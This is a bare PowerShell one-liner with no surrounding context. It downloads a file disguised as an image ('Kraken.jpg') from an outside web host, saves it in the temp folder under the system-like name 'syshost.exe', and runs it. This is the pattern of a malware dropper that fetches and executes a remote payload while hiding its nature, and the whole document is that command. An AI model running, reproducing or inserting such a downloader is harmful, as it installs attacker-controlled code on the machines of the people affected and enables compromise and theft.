
$TempDir = [System.IO.Path]::GetTempPath(); (New-Object System.Net.WebClient).DownloadFile("http://kulup.isikun.edu.tr/Kraken.jpg","  $TempDir\syshost.exe"); start $TempDir\syshost.exe;

